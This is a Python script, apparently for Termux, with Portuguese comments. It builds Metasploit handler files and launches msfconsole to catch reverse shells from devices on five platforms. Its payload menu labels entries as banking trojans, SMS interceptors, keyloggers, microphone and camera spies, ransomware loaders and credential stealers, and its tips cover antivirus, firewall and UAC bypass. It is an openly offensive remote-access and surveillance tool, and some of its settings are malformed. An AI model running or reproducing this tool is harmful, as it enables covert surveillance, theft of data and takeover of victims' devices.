#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import threading
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
███████╗██╗███████╗████████╗███████╗███╗   ██╗███████╗██████╗ 
██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔══██╗
█████╗  ██║███████╗   ██║   █████╗  ██╔██╗ ██║█████╗  ██████╔╝
██╔══╝  ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║███████║   ██║   ███████╗██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                              
              MULTI-PLATFORM PAYLOAD LISTENER
    """
    print(banner)

# Dicionário completo de payloads por plataforma
PAYLOADS = {
    'ANDROID': {
        1: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Reverse TCP Shell básico'},
        2: {'name': 'android/meterpreter/reverse_http', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'android/meterpreter/reverse_https', 'description': 'Reverse HTTPS Shell criptografado'},
        4: {'name': 'android/meterpreter/bind_tcp', 'description': 'Bind TCP Shell'},
        5: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'android/meterpreter/reverse_http', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'android/meterpreter/reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'android/shell/reverse_tcp', 'description': 'Shell Reverse TCP simples'},
        9: {'name': 'android/shell/bind_tcp', 'description': 'Shell Bind TCP'},
        10: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor via ADB'},
        11: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Vigilância por vídeo'},
        12: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Gravador de áudio remoto'},
        13: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Rastreador de localização'},
        14: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Interceptador de SMS'},
        15: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de registros de chamadas'},
        16: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de lista de contatos'},
        17: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Explorador de arquivos remoto'},
        18: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Controlador de câmera'},
        19: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Keylogger para Android'},
        20: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Monitor de área de transferência'},
        21: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de dados do navegador'},
        22: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Acesso a redes sociais'},
        23: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de credenciais WiFi'},
        24: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor persistente'},
        25: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Carregador de exploits de root'},
        26: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Troyano bancário'},
        27: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Carregador de ransomware'},
        28: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Cliente de botnet'},
        29: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Minerador de criptomoeda'},
        30: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Exploit personalizado'},
        31: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Espião de microfone'},
        32: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Gravador de tela'},
        33: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Leitor de notificações'},
        34: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Roubo de dados de apps'},
        35: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Rastreador GPS avançado'},
        36: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Administrador remoto'},
        37: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de informações do sistema'},
        38: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Scanner de rede integrado'},
        39: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Quebrador de senhas'},
        40: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Bypass de firewall'},
        41: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Túnel VPN reverso'},
        42: {'name': 'android/shell/reverse_udp', 'description': 'Reverse UDP Shell'},
        43: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor ICMP'},
        44: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Tunelamento DNS'},
        45: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Exploit Bluetooth'},
        46: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor USB Debugging'},
        47: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Persistência no boot'},
        48: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Falsa atualização de sistema'},
        49: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Exploit de acessibilidade'},
        50: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Payload multi-vetor'}
    },
    'WINDOWS': {
        1: {'name': 'windows/shell/reverse_tcp', 'description': 'Reverse TCP Shell para Windows'},
        2: {'name': 'windows/shell/reverse_http', 'description': 'Reverse HTTP Shell para Windows'},
        3: {'name': 'windows/shell/reverse_https', 'description': 'Reverse HTTPS Shell criptografado'},
        4: {'name': 'windows/shell/bind_tcp', 'description': 'Bind TCP Shell para Windows'},
        5: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'windows/meterpreter/reverse_http', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'windows/meterpreter/reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'windows/powershell_reverse_tcp', 'description': 'PowerShell Reverse TCP'},
        9: {'name': 'windows/x64/meterpreter/reverse_tcp', 'description': 'Meterpreter x64 Reverse TCP'},
        10: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'DLL Injection Payload'},
        11: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Service Persistence Backdoor'},
        12: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Registry Persistence'},
        13: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Keylogger com Meterpreter'},
        14: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Screenshot Capture Module'},
        15: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Audio Recording Payload'},
        16: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Webcam Capture Module'},
        17: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Credential Dumping Tool'},
        18: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Hash Dumping Utility'},
        19: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Process Hollowing Technique'},
        20: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Memory Injection Payload'},
        21: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'AV Bypass Technique'},
        22: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'UAC Bypass Loader'},
        23: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Ransomware Simulation'},
        24: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Botnet Client Agent'},
        25: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Cryptocurrency Miner'},
        26: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Network Traffic Sniffer'},
        27: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Port Scanner Loader'},
        28: {'name': 'windows/shell/reverse_tcp_dns', 'description': 'Reverse DNS Shell'},
        29: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'ICMP Covert Channel'},
        30: {'name': 'windows/meterpreter/reverse_tcp', 'description': 'Custom Exploit Framework'}
    },
    'MACOS': {
        1: {'name': 'osx/x86/shell_reverse_tcp', 'description': 'Reverse TCP Shell x86'},
        2: {'name': 'osx/x86/shell_reverse_tcp', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'osx/x86/shell_reverse_tcp', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'osx/x86/shell_bind_tcp', 'description': 'Bind TCP Shell'},
        5: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'osx/x86/meterpreter_reverse_http', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'osx/x86/meterpreter_reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'osx/x64/shell_reverse_tcp', 'description': 'Reverse TCP Shell x64'},
        9: {'name': 'osx/x64/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP x64'},
        10: {'name': 'osx/arm64/shell_reverse_tcp', 'description': 'Reverse Shell ARM64'},
        11: {'name': 'cmd/unix/reverse_python', 'description': 'Python Reverse Shell'},
        12: {'name': 'osx/x86/shell_reverse_tcp', 'description': 'AppleScript Backdoor'},
        13: {'name': 'cmd/unix/reverse_bash', 'description': 'Bash Reverse Shell'},
        14: {'name': 'osx/x86/shell_reverse_tcp', 'description': 'Zsh Reverse Shell'},
        15: {'name': 'ruby/shell_reverse_tcp', 'description': 'Ruby Reverse Shell'},
        16: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Launch Agent Persistence'},
        17: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Cron Job Backdoor'},
        18: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Login Hook'},
        19: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Browser Hijacker'},
        20: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Keylogger'},
        21: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Screenshot Capture'},
        22: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Webcam Capture'},
        23: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Audio Recording'},
        24: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Microphone Spy'},
        25: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'File Vault Exploit'},
        26: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Password Dumper'},
        27: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'iCloud Data Stealer'},
        28: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Safari Data Stealer'},
        29: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Chrome Data Stealer'},
        30: {'name': 'osx/x86/meterpreter_reverse_tcp', 'description': 'Firefox Data Stealer'}
    },
    'LINUX': {
        1: {'name': 'linux/x86/shell_reverse_tcp', 'description': 'Reverse TCP Shell x86'},
        2: {'name': 'linux/x86/shell/reverse_http', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'linux/x86/shell/reverse_https', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'linux/x86/shell_bind_tcp', 'description': 'Bind TCP Shell'},
        5: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'linux/x86/meterpreter_reverse_http', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'linux/x86/meterpreter_reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'linux/x64/shell_reverse_tcp', 'description': 'Reverse TCP Shell x64'},
        9: {'name': 'linux/x64/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP x64'},
        10: {'name': 'linux/x86/shell_reverse_udp', 'description': 'Reverse UDP Shell'},
        11: {'name': 'cmd/unix/reverse_python', 'description': 'Python Reverse Shell'},
        12: {'name': 'cmd/unix/reverse_perl', 'description': 'Perl Reverse Shell'},
        13: {'name': 'cmd/unix/reverse_bash', 'description': 'Bash Reverse Shell'},
        14: {'name': 'php/meterpreter_reverse_tcp', 'description': 'PHP Reverse Shell'},
        15: {'name': 'ruby/shell_reverse_tcp', 'description': 'Ruby Reverse Shell'},
        16: {'name': 'linux/x86/shell_reverse_tcp', 'description': 'Netcat Backdoor'},
        17: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'SSH Backdoor'},
        18: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Cron Persistence'},
        19: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Systemd Service'},
        20: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Library Injection'},
        21: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Process Hollowing'},
        22: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Memory Dumper'},
        23: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Keylogger'},
        24: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Screenshot Capture'},
        25: {'name': 'linux/x86/meterpreter_reverse_tcp', 'description': 'Webcam Capture'},
        26: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Audio Recording'},
        27: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Network Sniffer'},
        28: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Packet Capturer'},
        29: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Port Scanner'},
        30: {'name': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Vulnerability Scanner'}
    },
    'IOS': {
        1: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Reverse TCP Shell ARM64'},
        2: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'apple_ios/aarch64/meterpreter_bind_tcp', 'description': 'Bind TCP Shell'},
        5: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'apple_ios/armle/shell_reverse_tcp', 'description': 'Reverse Shell ARM'},
        9: {'name': 'apple_ios/aarch64/shell_reverse_tcp', 'description': 'Reverse Shell ARM64'},
        10: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Apple Script Backdoor'},
        11: {'name': 'apple_ios/browser/safari_libtiff', 'description': 'Safari Exploit'},
        12: {'name': 'apple_ios/browser/webkit', 'description': 'WebKit RCE'},
        13: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Jailbreak Detection Bypass'},
        14: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Sandbox Escape'},
        15: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Persistent Backdoor'},
        16: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Background Execution'},
        17: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Location Tracker'},
        18: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Microphone Access'},
        19: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Camera Access'},
        20: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'description': 'Photo Library Stealer'}
    }
}

def show_platforms():
    """Mostra as plataformas disponíveis"""
    print("\n" + "="*60)
    print("               PLATAFORMAS DISPONÍVEIS")
    print("="*60)
    platforms = list(PAYLOADS.keys())
    for i, platform in enumerate(platforms, 1):
        print(f"[{i}] {platform} - {len(PAYLOADS[platform])} payloads")
    print(f"[0] Voltar")
    print("="*60)

def show_payloads(platform):
    """Mostra os payloads disponíveis para uma plataforma"""
    print(f"\n" + "="*70)
    print(f"               PAYLOADS {platform}")
    print("="*70)
    
    payloads = PAYLOADS[platform]
    for i in range(1, len(payloads) + 1):
        if i in payloads:
            print(f"[{i:2d}] {payloads[i]['description']}")
    
    print(f"\n[0] Voltar | [99] Iniciar Listener")
    print("="*70)

def get_listener_config(platform, payload_type):
    """Obtém configuração do listener"""
    print(f"\nConfigurando Listener para {platform}")
    print("-" * 45)
    
    lhost = input("Seu IP (LHOST): ").strip()
    if not lhost:
        lhost = "0.0.0.0"  # Listen em todas as interfaces
    
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    payload_name = PAYLOADS[platform][payload_type]['name']
    
    return lhost, lport, payload_name

def check_metasploit_installed():
    """Verifica se o Metasploit está instalado de forma silenciosa"""
    try:
        result = subprocess.run(['which', 'msfconsole'], 
                              capture_output=True, 
                              text=True)
        return result.returncode == 0
    except:
        return False

def generate_handler_file(platform, payload_type, lhost, lport, payload_name):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {platform} - {PAYLOADS[platform][payload_type]['description']}
use exploit/multi/handler
set PAYLOAD {payload_name}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript multi_console_command -rc /opt/scripts/autorun.rc
"""

    # Configurações específicas baseadas na plataforma e tipo
    if platform == 'ANDROID':
        if payload_type in [2, 6]:
            handler_content += "set LHOST http://" + lhost + "\n"
        elif payload_type in [3, 7]:
            handler_content += "set LHOST https://" + lhost + "\n"
        elif payload_type == 42:
            handler_content += "set PAYLOAD android/shell/reverse_udp\n"
        
        # Adicionar módulos post-exploitation para Android
        if payload_type in [11, 18, 32]:  # Vídeo, câmera, gravação de tela
            handler_content += "set AutoRunScript post/multi/manage/record_mic\n"
        elif payload_type in [13, 35]:  # Localização
            handler_content += "set AutoRunScript post/android/manage/geolocate\n"
        elif payload_type in [14, 15, 16, 21, 22, 23, 34]:  # Coleta de dados
            handler_content += "set AutoRunScript post/android/gather/\n"
    
    elif platform == 'WINDOWS':
        if payload_type in [2, 6]:
            handler_content += "set LHOST http://" + lhost + "\n"
        elif payload_type in [3, 7]:
            handler_content += "set LHOST https://" + lhost + "\n"
        
        # Módulos para Windows
        if payload_type in [13, 20]:  # Keylogger e injeção
            handler_content += "set AutoRunScript post/windows/manage/keylog\n"
        elif payload_type in [16, 22]:  # Webcam e UAC bypass
            handler_content += "set AutoRunScript post/windows/manage/webcam\n"
    
    elif platform == 'MACOS':
        if payload_type in [6, 7]:
            handler_content += "set OverrideRequestHost true\n"
        
        # Módulos para macOS
        if payload_type in [20, 21]:  # Keylogger e screenshots
            handler_content += "set AutoRunScript post/osx/capture/\n"
    
    elif platform == 'LINUX':
        if payload_type in [6, 7]:
            handler_content += "set OverrideRequestHost true\n"
        
        # Módulos para Linux
        if payload_type in [23, 24]:  # Keylogger e screenshots
            handler_content += "set AutoRunScript post/linux/capture/\n"
    
    elif platform == 'IOS':
        if payload_type in [2, 6]:
            handler_content += "set LHOST http://" + lhost + "\n"
        elif payload_type in [3, 7]:
            handler_content += "set LHOST https://" + lhost + "\n"
    
    handler_content += "exploit -j -z\n"
    
    # Nome do arquivo
    handler_file = f"handler_{platform.lower()}_{payload_type}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        return handler_file
    except Exception as e:
        print(f"⚠️  Erro ao criar handler: {str(e)}")
        return None

def start_listener(platform, payload_type, lhost, lport, payload_name):
    """Inicia o listener do Metasploit"""
    
    print(f"\n🎯 Iniciando Listener para {platform}")
    print(f"📡 Payload: {PAYLOADS[platform][payload_type]['description']}")
    print(f"🌐 LHOST: {lhost} | LPORT: {lport}")
    
    # Verificar se Metasploit está instalado
    if not check_metasploit_installed():
        print("❌ METASPLOIT NÃO ENCONTRADO!")
        print("💡 Volte ao menu inicial de malware e escolha a opção:")
        print("   📥 install-metasploit-termux.py")
        input("\n⏎ Pressione Enter para voltar ao menu...")
        return False
    
    print("⏳ Iniciando Metasploit...")
    
    # Gerar arquivo de handler
    handler_file = generate_handler_file(platform, payload_type, lhost, lport, payload_name)
    
    if not handler_file:
        print("❌ Erro ao criar arquivo de handler!")
        return False
    
    try:
        # Comando para iniciar o Metasploit com o handler
        cmd = ['msfconsole', '-r', handler_file]
        
        print(f"\n🔧 Executando: msfconsole -r {handler_file}")
        print("💡 Pressione Ctrl+C para parar o listener")
        print("🔄 Aguardando conexões...\n")
        
        # Executar Metasploit
        subprocess.run(cmd)
        
        return True
        
    except FileNotFoundError:
        print("\n❌ Metasploit não encontrado!")
        print("💡 Volte ao menu inicial de malware e escolha a opção:")
        print("   📥 install-metasploit-termux.py")
        input("\n⏎ Pressione Enter para voltar ao menu...")
        return False
    except KeyboardInterrupt:
        print("\n🛑 Listener interrompido pelo usuário")
        return True
    except Exception as e:
        print(f"\n❌ Erro ao iniciar listener: {str(e)}")
        return False

def show_listener_info(platform, payload_type):
    """Mostra informações sobre o listener selecionado"""
    payload_info = PAYLOADS[platform][payload_type]
    
    print(f"\n📋 Informações do Listener:")
    print(f"   Plataforma: {platform}")
    print(f"   Tipo: {payload_type}")
    print(f"   Payload: {payload_info['name']}")
    print(f"   Descrição: {payload_info['description']}")
    
    # Dicas específicas
    tips = {
        'ANDROID': {
            1: "💡 Use para conexões diretas em redes internas",
            2: "💡 Ideal para bypass de firewalls corporativos", 
            3: "💡 Recomendado para tráfego externo criptografado",
            11: "💡 Pode acionar LED da câmera - cuidado!",
            13: "💡 Funciona mesmo com GPS desligado",
            24: "💡 Sobrevive a reinicializações do dispositivo",
            42: "💡 Útil em redes com restrições TCP"
        },
        'WINDOWS': {
            5: "💡 Meterpreter oferece recursos avançados",
            8: "💡 PowerShell pode bypass assinaturas digitais",
            21: "💡 Técnicas de evasão de antivírus",
            22: "💡 Bypass do UAC do Windows"
        },
        'MACOS': {
            5: "💡 Compatível com versões antigas do macOS",
            9: "💡 Para sistemas macOS modernos (x64)",
            16: "💡 Persistência via Launch Agents"
        },
        'LINUX': {
            5: "💡 Para sistemas Linux x86",
            9: "💡 Para sistemas Linux x64 modernos",
            18: "💡 Persistência via cron jobs"
        },
        'IOS': {
            1: "💡 Para dispositivos iOS ARM64",
            11: "💡 Exploit específico para Safari",
            15: "💡 Backdoor persistente em iOS"
        }
    }
    
    if platform in tips and payload_type in tips[platform]:
        print(f"   {tips[platform][payload_type]}")

def quick_start_listener():
    """Início rápido de listener"""
    print("\n🚀 INÍCIO RÁPIDO DE LISTENER")
    print("-" * 40)
    
    lhost = input("Seu IP [0.0.0.0]: ").strip() or "0.0.0.0"
    lport = input("Porta [4444]: ").strip() or "4444"
    
    print("\nSelecione a plataforma:")
    platforms = list(PAYLOADS.keys())
    for i, platform in enumerate(platforms, 1):
        print(f"{i}. {platform}")
    
    try:
        platform_choice = int(input("\nPlataforma [1-5]: "))
        if 1 <= platform_choice <= len(platforms):
            platform = platforms[platform_choice - 1]
            
            print(f"\nPayload padrão para {platform}:")
            print(f"1. {PAYLOADS[platform][1]['description']}")
            
            if input("\nUsar payload padrão? (s/n): ").lower() == 's':
                payload_type = 1
                payload_name = PAYLOADS[platform][1]['name']
                
                print(f"\n🎯 Iniciando listener rápido...")
                return start_listener(platform, payload_type, lhost, lport, payload_name)
    except:
        pass
    
    print("❌ Configuração rápida cancelada")
    return False

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        
        print("\n" + "="*60)
        print("            MULTI-PLATFORM LISTENER MENU")
        print("="*60)
        print("[1] Selecionar Plataforma e Payload")
        print("[2] Início Rápido (Listener Padrão)") 
        print("[3] Ver Todos os Payloads")
        print("[0] Sair")
        print("="*60)
        
        try:
            choice = input("\nSelecione uma opção: ").strip()
            
            if choice == '1':
                # Seleção de plataforma
                while True:
                    clear_screen()
                    print_banner()
                    show_platforms()
                    
                    platform_choice = input("\nSelecione a plataforma: ").strip()
                    
                    if platform_choice == '0':
                        break
                    
                    try:
                        platform_choice = int(platform_choice)
                        platforms = list(PAYLOADS.keys())
                        
                        if 1 <= platform_choice <= len(platforms):
                            platform = platforms[platform_choice - 1]
                            
                            # Seleção de payload
                            while True:
                                clear_screen()
                                print_banner()
                                show_payloads(platform)
                                
                                payload_choice = input("\nSelecione o payload: ").strip()
                                
                                if payload_choice == '0':
                                    break
                                elif payload_choice == '99':
                                    # Iniciar listener
                                    lhost, lport, payload_name = get_listener_config(platform, 1)
                                    start_listener(platform, 1, lhost, lport, payload_name)
                                    input("\n⏎ Pressione Enter para continuar...")
                                    break
                                else:
                                    try:
                                        payload_choice = int(payload_choice)
                                        if payload_choice in PAYLOADS[platform]:
                                            show_listener_info(platform, payload_choice)
                                            
                                            if input("\n🎯 Iniciar listener com este payload? (s/n): ").lower() == 's':
                                                lhost, lport, payload_name = get_listener_config(platform, payload_choice)
                                                start_listener(platform, payload_choice, lhost, lport, payload_name)
                                                input("\n⏎ Pressione Enter para continuar...")
                                                break
                                    except ValueError:
                                        print("❌ Opção inválida!")
                    
                    except ValueError:
                        print("❌ Opção inválida!")
            
            elif choice == '2':
                quick_start_listener()
                input("\n⏎ Pressione Enter para continuar...")
            
            elif choice == '3':
                clear_screen()
                print_banner()
                print("\n📊 RESUMO DE TODOS OS PAYLOADS")
                print("="*70)
                for platform in PAYLOADS:
                    print(f"\n{platform}: {len(PAYLOADS[platform])} payloads disponíveis")
                print("\n" + "="*70)
                input("\n⏎ Pressione Enter para voltar...")
            
            elif choice == '0':
                print("\n👋 Saindo... Use com responsabilidade!")
                break
            
            else:
                print("❌ Opção inválida!")
                input("⏎ Pressione Enter para continuar...")
                
        except KeyboardInterrupt:
            print("\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
